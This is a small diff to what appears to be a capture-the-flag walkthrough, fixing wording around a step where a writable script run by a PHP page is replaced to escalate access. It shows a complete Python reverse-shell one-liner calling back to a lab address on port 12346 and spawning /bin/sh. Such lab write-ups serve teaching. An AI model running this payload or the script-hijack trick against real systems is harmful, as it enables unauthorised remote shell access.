@@ -107,9 +107,9 @@ file_put_contents($file, '');
 exec('/var/www/cmd/logcleared.sh');
 ?>
 ```
-So apparently this script gets calles another script located at /var/www/cmd/logcleared.sh every minute, lets see if we can make it spawn another reverse shell with python3.
+So apparently this script calls another script located at /var/www/cmd/logcleared.sh, lets see if we can make it spawn another reverse shell with python3.
 
-So I created a logcleared.sh with containing this code:
+So I created a logcleared.sh containing this code:
 
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",12346));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
